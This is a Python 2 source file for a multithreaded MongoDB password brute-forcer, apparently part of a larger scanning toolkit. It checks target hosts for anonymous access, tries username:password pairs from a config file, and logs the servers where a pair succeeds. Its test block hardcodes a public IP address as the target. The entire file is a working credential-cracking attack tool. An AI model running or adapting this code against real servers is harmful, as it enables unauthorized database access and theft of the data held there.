#coding=utf-8
import time
import threading
from printers import printPink,printRed,printGreen
from multiprocessing.dummy import Pool
import pymongo


class mongodb_burp(object):

    def __init__(self,c):
        self.config=c
        self.lock=threading.Lock()
        self.result=[]
        self.lines=self.config.file2list("conf/mongodb.conf")


    def mongoDB_connect(self,ip,username,password,port):
        crack=0
        try:
            connection=pymongo.Connection(ip,port)
            db=connection.admin
            db.collection_names()
            self.lock.acquire()
            printRed('%s mongodb service at %s allow login Anonymous login!!\r\n' %(ip,port))
            self.result.append('%s mongodb service at %s allow login Anonymous login!!\r\n' %(ip,port))
            self.lock.release()
            crack=1

        except Exception,e:
            if e[0]=='database error: not authorized for query on admin.system.namespaces':
                try:
                    r=db.authenticate(username,password)
                    if r!=False:
                        crack=2
                    else:               
                        self.lock.acquire()
                        crack=3
                        print "%s mongodb service 's %s:%s login fail " %(ip,username,password)
                        self.lock.release()                   
                except Exception,e:
                    pass

            else:
                printRed('%s mongodb service at %s not connect' %(ip,port))
                crack=4
        return crack



    def mongoDB(self,ip,port):
            try:
                for data in self.lines:
                    username=data.split(':')[0]
                    password=data.split(':')[1]
                    flag=self.mongoDB_connect(ip,username,password,port)
                    if flag in [1,4]:
                        break

                    if flag==2:
                        self.lock.acquire()
                        printGreen("%s mongoDB at %s has weaken password!!-------%s:%s\r\n" %(ip,port,username,password))
                        self.result.append("%s mongoDB at %s has weaken password!!-------%s:%s\r\n" %(ip,port,username,password))
                        self.lock.release()
                        break
            except Exception,e:
                pass


    def run(self,ipdict,pinglist,threads,file):
        if len(ipdict['mongodb']):
            printPink("crack mongodb  now...")
            print "[*] start crack mongodb  %s" % time.ctime()
            starttime=time.time()

            pool=Pool(threads)

            for ip in ipdict['mongodb']:
                pool.apply_async(func=self.mongoDB,args=(str(ip).split(':')[0],int(str(ip).split(':')[1])))

            pool.close()
            pool.join()
            print "[*] stop mongoDB serice  %s" % time.ctime()
            print "[*] crack mongoDB done,it has Elapsed time:%s " % (time.time()-starttime)

            for i in xrange(len(self.result)):
                self.config.write_file(contents=self.result[i],file=file) 


if __name__ == '__main__':
    import sys
    sys.path.append("../")
    from comm.config import *
    c=config()
    ipdict={'mongodb': ['112.90.23.158:27017']} 
    pinglist=['192.168.1.1']
    test=mongodb_burp(c)
    test.run(ipdict,pinglist,50,file="../result/test")



